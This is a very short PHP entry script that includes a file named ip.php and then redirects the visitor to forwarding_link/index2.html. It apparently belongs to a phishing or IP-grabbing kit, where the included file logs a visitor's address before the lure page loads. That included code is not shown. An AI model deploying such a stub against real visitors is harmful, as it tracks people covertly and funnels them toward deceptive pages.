<?php
include 'ip.php';
header('Location: forwarding_link/index2.html');
exit
?>
